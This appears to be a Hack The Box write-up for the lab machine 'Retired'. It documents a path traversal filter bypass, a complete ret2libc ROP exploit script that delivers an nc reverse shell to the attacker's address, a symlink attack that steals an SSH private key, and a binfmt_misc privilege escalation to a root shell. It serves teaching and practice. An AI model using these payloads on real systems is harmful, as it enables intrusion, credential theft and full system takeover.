@@ -1,0 +1,501 @@
+                     Retired
+
+                                                                                  11rd August 2022 / Document No
+                                                                            D22.100.193
+
+                                                                                  Prepared By: polarbearer
+                                                                                  Machine Author(s): uco2KFh
+
+                                                                                  Difficulty: Medium
+                                                                                  Classification: Official
+
+                                 Synopsis
+
+Retired is a medium difficulty Linux machine that focuses on simple web attacks, stack-based
+binary exploitation and insecure kernel features. Initial foothold is gained by exploiting a path
+traversal vulnerability in a web application, which leads to the discovery of an internal service that
+is handling uploaded data. The corresponding binary file, its dependencies and memory map can
+be downloaded via the same path traversal vector, and analysed to identify a buffer overflow
+vulnerability and obtain the necessary memory addresses and ROP gadgets to develop a working
+exploit, resulting in an interactive shell on the system. Lateral movement to a second low-
+privileged user is possible by performing a symlink attack on a scheduled backup script, gaining
+access to the user's home directory and their private SSH key file. Finally, a helper program that
+allows the user to write data to /proc/sys/fs/binfmt_misc/register is found, allowing for
+privilege escalation by leveraging the credentials flag when registering a custom handler for
+root -owned setuid files.
+
+Skills Required
+
+      Enumeration
+      Exploiting path traversal vulnerabilities
+      Basic Linux knowledge
+      Basic binary exploitation knowledge
+
+Skills Learned
+      Developing ROP/ret2libc exploits for stack-based buffer overflows
+      Gaining root privileges through writable /proc/sys/fs/binfmt_misc/register
+
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.154 | grep ^[0-9] | cut -d '/' -f1
+   | tr '\n' ',' | sed s/,$//)
+   nmap -sC -sV -p$ports 10.10.11.154
+
+Nginx
+
+Browsing to the web server on port 80, we are redirected to /index.php?page=default.html .
+The page mentions a handheld gaming console named OSTRICH and an official software
+emulator, only available to beta testers, called EMUEMU .
+
+Since we know that both php and html are used, we run gobuster to search for additional
+available pages to read.
+   gobuster dir -u http://10.10.11.154 -w /usr/share/dirb/wordlists/common.txt -x
+   php,html -q
+
+The beta.html page is found, which contains a form for submitting license keys.
+
+Submitted keys are said to be activated by running an application called activate_license . We
+take note of this as it may be useful later.
+The form posts data to activate_license.php :
+
+   <form action="activate_license.php" method="post" enctype="multipart/form-data">
+
+Foothold
+
+Setting index.php as the page parameter ( index.php?page=index.php ) reveals the source
+code of the page.
+
+   <?php
+   function sanitize_input($param) {
+
+          $param1 = str_replace("../","",$param);
+          $param2 = str_replace("./","",$param1);
+          return $param2;
+   }
+   $page = $_GET['page'];
+   if (isset($page) && preg_match("/^[a-z]/", $page)) {
+          $page = sanitize_input($page);
+   } else {
+          header('Location: /index.php?page=default.html');
+   }
+   readfile($page);
+   ?>
+
+Notice that the code does not get executed because readfile() (and not include() ) is used to
+read the page. This means we cannot exploit this as a local file include vulnerability, but the weak
+regex filters can be easily bypassed to read arbitrary files. First, the /^[a-z]/ regular expression
+looks for a single lowercase alphabetic character at the beginning of the page parameter; next,
+the first (and only the first) occurrences of ../ and ./ are removed one after the other, allowing
+us to use the string ...../// , which will be first converted to ...// and finally to ../ , to
+traverse directories up to the root.
+
+For example, the following request allows us to read the /etc/passwd file.
+
+   curl http://10.10.11.154/index.php?
+   page=a.....///.....///.....///.....///.....///etc/passwd
+
+We retrieve the source code of the activate_license.php page we discovered earlier:
+   curl http://10.10.11.154/index.php?page=activate_license.php
+
+<?php
+
+if(isset($_FILES['licensefile'])) {
+
+$license  = file_get_contents($_FILES['licensefile']['tmp_name']);
+
+$license_size = $_FILES['licensefile']['size'];
+
+$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+if (!$socket) { echo "error socket_create()\n"; }
+
+if (!socket_connect($socket, '127.0.0.1', 1337)) {
+          echo "error socket_connect()" . socket_strerror(socket_last_error()) .
+
+"\n";
+       }
+
+socket_write($socket, pack("N", $license_size));
+socket_write($socket, $license);
+
+       socket_shutdown($socket);
+       socket_close($socket);
+}
+?>
+
+The page is sending data to an internal service listening on port 1337, which expects the size of
+the license key followed by the key itself. As noted previously, an application named
+activate_license might be responsible for license activation. We can retrieve the application
+binary from the easily guessable path /usr/bin/activate_license :
+
+   curl http://10.10.11.154/index.php?
+   page=a.....///.....///.....///.....///.....///usr/bin/activate_license -o
+   activate_license
+
+Some common security measures, like non-executable stack (NX), position-independent
+executable (PIE) and full Relocation Read-Only (RELRO), are enabled. This means that in case of a
+stack-based buffer overflow vulnerability we would not be able to execute shellcode directly from
+the stack; additionally, the binary and its dependencies are loaded into random virtual memory
+locations on each execution, making Return-Oriented Programming (ROP) attacks more difficult.
+Full RELRO makes the entire Global Offset Table (GOT) read-only, thus preventing GOT overwrite
+attacks.
+
+We could assume Address Space Layout Randomization (ASLR) to be enabled as well, but we can
+easily check this by reading the /proc/sys/kernel/randomize_va_space file:
+
+   curl http://10.10.11.154/index.php?
+   page=a.....///.....///.....///.....///.....///proc/sys/kernel/randomize_va_space
+However, stack canaries are not enabled, which could make stack-based buffer overflow
+exploitation easier.
+We open the binary with Ghidra to identify potential vulnerabilities. We focus our attention to the
+activate_license() function, which is called on successful connections. As we can see, an
+arbitrary number of bytes ( msglen ) is read from the socket descriptor sockfd into the 512-byte
+buffer string by calling the POSIX read() function.
+
+       uint32_t msglen;
+       char buffer [512];
+       sVar2 = read(sockfd,&msglen,4);
+       if (sVar2 == -1) {
+
+          piVar3 = __errno_location();
+          pcVar4 = strerror(*piVar3);
+          error(pcVar4);
+       }
+       msglen = ntohl(msglen);
+       printf("[+] reading %d bytes\n",msglen);
+       sVar2 = read(sockfd,buffer,(ulong)msglen);
+
+Since both the msglen and buffer values are user-controlled and no checks are performed on
+the input, this leads to a stack-based buffer overflow vulnerability.
+The first thing we have to do before we start developing our exploit is finding the offset between
+the buffer and the saved RIP address. To do so, we can use the pattern_create and
+pattern_offset functions from PEDA. We open the program with GDB:
+
+   gdb -q ./activate_license
+
+We generate a 600-byte pattern and run the program:
+   pattern_create 600
+   set follow-fork-mode child
+   run 1337
+
+We run the following script to send the generated pattern to the listening server:
+   #!/usr/bin/python3
+   from pwn import *
+   import sys
+   msg = sys.argv[1].encode()
+   r = remote('localhost', 1337)
+   r.send(p32(len(msg), endian='big'))
+   r.send(msg)
+
+   python getoffset.py "AAA%AAsAABAA$AAnAACAA-
+   AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAA<SNIP>"
+As expected, this results in a segmentation fault.
+
+To find the saved RIP offset, we take the current RSP value and use the pattern_offset
+command:
+
+   x/xg $rsp
+   pattern_offset 0x73413973416a7341
+
+Since we identified the correct offset, we can start working on our payload. We know NX is
+enabled, so our best option is to use a ROP/ret2libc approach. Since ASLR is also enabled, we
+need a way to leak the absolute addresses where the program and its libraries are currently
+loaded. The /proc/<PID>/maps file, which we may be able to read via the path traversal
+vulnerability in index.php contains the information we are seeking, but it requires knowing the
+PID of the running activate_license process. This can be obtained in a few different ways,
+including a full PID brute force (which could prove to be very inefficient). A much quicker way of
+obtaining this information is to read the task scheduler debug file, which can be found in
+/proc/sched_debug or /sys/kernel/debug/sched/debug depending on the Linux distribution
+and kernel version, if available. This file among other information contains a summary of tasks
+running on each processor including their PID. On the target system which is running Debian 11,
+the file can be found in /proc/sched_debug :
+   curl http://10.10.11.154/index.php?
+   page=a.....///.....///.....///.....///.....///proc/sched_debug 2>&1| grep
+   activate
+
+The file we want is /proc/434/maps :
+   curl http://10.10.11.154/index.php?
+   page=a.....///.....///.....///.....///.....///proc/434/maps
+
+The base address of the activate_license binary is 0x561afcc08000 , while the libc-2.31.so
+library is loaded at 0x7fc7d4c5c000 . To get the offset of the system() function, and to search
+for ROP gadgets in libc, we need to download the library:
+
+   curl http://10.10.11.154/index.php?
+   page=a.....///.....///.....///.....///.....///usr/lib/x86_64-linux-gnu/libc-
+   2.31.so -o libc-2.31.so
+We use objdump to read the system() offset:
+   objdump -d libc-2.31.so | grep '^[0-9].*system'
+We need a few ROP gadgets to pop data from the stack and to write our payload to a writable
+memory address. We find a pop rdi gadget in the activate_license binary:
+
+   ropper -f activate_license --search 'pop rdi; ret'
+
+Other gadgets are found in the libc-2.31.so library:
+   ropper -f libc-2.31.so --search 'pop rdx; ret'
+   ropper -f libc-2.31.so --search 'mov [rdi], rdx; ret'
+We use rabin2 to search for the offset a writable section (e.g. data ) in the activate_license
+binary:
+
+   rabin2 -S activate_license
+
+We now have everything we need to build our exploit ( rce.py ).
+   #!/usr/bin/python
+   from sys import argv
+   from pwn import *
+   import requests
+   def perform_rce(rhost, lhost):
+          # address of activate_license in memory; from /proc/$PID/maps of running
+   system
+          actbase = 0x561afcc08000
+          # address of libc in memory; from /proc/$PID/maps of running system
+          libcbase = 0x7fc7d4c5c000
+          # ROP gadgets
+          pop_rdi = p64(actbase + 0x0000181b) # pop rdi; ret;
+          pop_rdx = p64(libcbase + 0x000cb1cd) # pop rdx; ret;
+          mov = p64(libcbase + 0x0003ace5) # mov qword ptr [rdi], rdx; ret;
+          # offfsets
+          offset = 520 # offset between buffer and overwriting saved rip
+          system = p64(libcbase + 0x00048e50)
+          writable = actbase + 0x00004000
+
+          # build payload
+          cmd = b"bash -c 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s
+   7777 >/tmp/f' \x00" % lhost.encode()
+          rop = b''
+          rop += b'A'*offset # junk padding before new rip
+          for i in range(0,len(cmd),8):
+
+                 rop += pop_rdi
+                 rop += p64(writable + i)
+                 rop += pop_rdx
+                 rop += cmd[i:i+8].ljust(8, b"\x00")
+                 rop += mov
+
+          rop += pop_rdi
+          rop += p64(writable)
+          rop += system
+
+          with open('getshell.key','wb') as f:
+                 f.write(rop)
+
+          files = {"licensefile": ("getshell.key", open("getshell.key","rb"),
+   'application/x-iwork-keynote-sffkey')}
+
+          requests.post(f"http://{rhost}/activate_license.php", files=files)
+
+   perform_rce(argv[1], argv[2])
+
+The script generates a reverse shell ROP chain and writes the payload to a license file, then
+uploads it by posting a request to activate_license.php . It takes two command-line
+parameters (remote and local address) and returns a reverse shell on port 7777.
+We open a Netcat listener and then execute the exploit:
+
+   nc -lnvp 7777
+
+   ./rce.py 10.10.11.154 10.10.14.26
+
+A reverse shell as the www-data user is immediately sent back to our listener.
+Lateral Movement
+
+A low-privileged user named dev is defined on the system, as we can see by reading
+/etc/passwd and by listing the available home directories.
+
+Standard system enumeration reveals an interesting systemd timer called
+website_backup.timer that is scheduled to run every minute.
+
+The timer runs the website_backup.service service. We read the corresponding service unit:
+   systemctl cat website_backup.service
+
+The /usr/bin/webbackup script contains the following code:
+   #!/bin/bash
+   set -euf -o pipefail
+   cd /var/www/
+   SRC=/var/www/html
+   DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"
+   /usr/bin/rm --force -- "$DST"
+   /usr/bin/zip --recurse-paths "$DST" "$SRC"
+
+   KEEP=10
+   /usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \
+
+          | sort --zero-terminated --numeric-sort --reverse \
+          | while IFS= read -r -d '' backup; do
+
+                 if [ "$KEEP" -le 0 ]; then
+                         /usr/bin/rm --force -- "$backup"
+
+                 fi
+                 KEEP="$((KEEP-1))"
+          done
+
+The backup script creates a zip archive of /var/www/html and writes it to a world-readable
+location, then deletes the oldest backups while retaining the ten most recent ones. The zip
+program follows symbolic links by default (the --symlinks option can be used to store symbolic
+links as such instead of following them), and the systemd unit runs the script as the dev user.
+Since we have a shell as www-data , and we have write access to /var/www/html , we can create a
+symlink to any file or directory owned by dev , which will result in such files/directories being
+added to the zip archive. For example, we can add the entire /home/dev directory:
+
+   ln -s /home/dev /var/www/html/dev
+
+We wait for the timer to trigger and then copy the resulting zip archive to a temporary directory
+and extract it:
+
+   cd `mktemp -d`
+   cp /var/www/2022-08-10_13-46-01-html.zip .
+   unzip 2022-08-10_13-46-01-html.zip
+
+Among the extracted files we find the contents of /home/dev , including the private SSH key file in
+var/www/html/dev/.ssh/id_rsa . We copy this file to our attacking machine, give it the correct
+permissions and use it to establish an SSH session to the system as dev .
+
+   chmod 600 id_rsa
+   ssh -i id_rsa dev@10.10.11.154
+The user flag can be found in /home/dev/user.txt .
+
+Privilege Escalation
+
+In the user's home directory we find the source code of the emuemu project.
+
+The emuemu.c file is currently just a stub that prints an "under development" message.
+   #include <stdio.h>
+
+   /* currently this is only a dummy implementation doing nothing */
+
+   int main(void) {
+          puts("EMUEMU is still under development.");
+          return 1;
+
+   }
+
+Far more interesting is reg_helper.c , which acts as a wrapper allowing writes to
+/proc/sys/fs/binfmt_misc/register .
+
+   #define _GNU_SOURCE
+
+   #include <fcntl.h>
+   #include <stdio.h>
+   #include <string.h>
+   #include <sys/stat.h>
+   #include <sys/types.h>
+   #include <unistd.h>
+
+   int main(void) {
+          char cmd[512] = { 0 };
+
+          read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;
+
+          int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);
+          if (-1 == fd)
+
+                 perror("open");
+          if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1)
+
+                 perror("write");
+          if (close(fd) == -1)
+
+                 perror("close");
+
+          return 0;
+   }
+
+The Kernel Support for miscellaneous Binary Formats (binfmt_misc) feature allows to register
+custom interpreters for specific file types (either by magic byte sequences or by file extension) in
+order to automatically invoke them just by typing the file name.
+From the Makefile we can see that reg_helper is installed to /usr/lib/emuemu and given
+cap_dac_override capabilities, allowing anyone who can execute the program to write data to
+the binfmt_misc register. It is then used to register /usr/bin/emuemu as an interpreter for
+OSTRICH ROM files.
+
+   CC := gcc
+   CFLAGS := -std=c99 -Wall -Werror -Wextra -Wpedantic -Wconversion -Wsign-
+   conversion
+
+   SOURCES := $(wildcard *.c)
+   TARGETS := $(SOURCES:.c=)
+
+   .PHONY: install clean
+   install: $(TARGETS)
+                 @echo "[+] Installing program files"
+                 install --mode 0755 emuemu /usr/bin/
+                 mkdir --parent --mode 0755 /usr/lib/emuemu /usr/lib/binfmt.d
+                 install --mode 0750 --group dev reg_helper /usr/lib/emuemu/
+                 setcap cap_dac_override=ep /usr/lib/emuemu/reg_helper
+
+                 @echo "[+] Register OSTRICH ROMs for execution with EMUEMU"
+                 echo ':EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:' \
+
+                                | tee /usr/lib/binfmt.d/emuemu.conf \
+                                | /usr/lib/emuemu/reg_helper
+
+   clean:
+                 rm -f -- $(TARGETS)
+
+We can see that /usr/lib/emuemu/reg_helper exists, is executable by the dev group and has
+indeed the cap_dac_override capability, effectively allowing us to write arbitrary data to
+/proc/sys/fs/binfmt_misc/register .
+
+According to the binfmt_misc documentation, the binfmt_misc register accepts strings in the
+following format where flags are optional.:
+
+   :name:type:offset:magic:mask:interpreter:flags
+
+In particular, if an interpreter is registered with the C flag then the credentials and security token
+of the new process will be calculated from the binary, meaning the interpreter which can be any
+program under our control will be executed with root privileges when a root-owned setuid binary
+associated with it is run through binfmt_misc .
+
+   C - credentials
+
+   Currently, the behavior of binfmt_misc is to calculate the credentials and
+   security token of the new process according to the interpreter. When this flag is
+   included, these attributes are calculated according to the binary. It also
+   implies the O flag. This feature should be used with care as the interpreter will
+   run with root permissions when a setuid binary owned by root is run with
+   binfmt_misc.
+
+To take advantage of this, we create a simple program ( handler.c ) that sets uid and gid to
+zero to spawn a shell with root privileges, ignoring any command-line arguments. This will act as
+our interpreter.
+   #include <stdlib.h>
+   #include <sys/types.h>
+   #include <unistd.h>
+   int main(void)
+   {
+
+       setuid(0);
+       setgid(0);
+       system("/bin/bash");
+   }
+We compile it:
+   gcc -o handler handler.c
+In order to make setuid(0) and setgid(0) work, the program needs to run with root
+privileges. To accomplish this, as seen above, we need to register our handler with the
+credentials flag for a setuid binary owned by root . We search for such files:
+   find / -user root -perm -4000 -executable 2>/dev/null
+
+Instead of trying to override the default kernel handler for ELF files, we can simply create a
+symbolic link with a custom extension and register a handler for the chosen extension by setting
+the recognition type to E :
+
+   type
+          is the type of recognition. Give M for magic and E for extension.
+
+This is possible because binfmt_misc handlers follow symlinks. We can choose any of the above
+setuid files since it will not be actually executed but instead the handler just spawns a shell. We
+create a link in the current directory:
+
+   ln -s /usr/bin/chfn chfn.HACKTHEBOX
+We send the following string to the reg_helper program to register our handler as the
+interpreter for .HACKTHEBOX files:
+
+   echo ":HTB:E::HACKTHEBOX::$(realpath handler):C" | /usr/lib/emuemu/reg_helper
+We can now execute the chfn.HACKTHEBOX file, which will cause the registered handler to run
+and spawn a root shell.
+
+   ./chfn.HACKTHEBOX
+
+The root flag can be found in /root/root.txt .
+
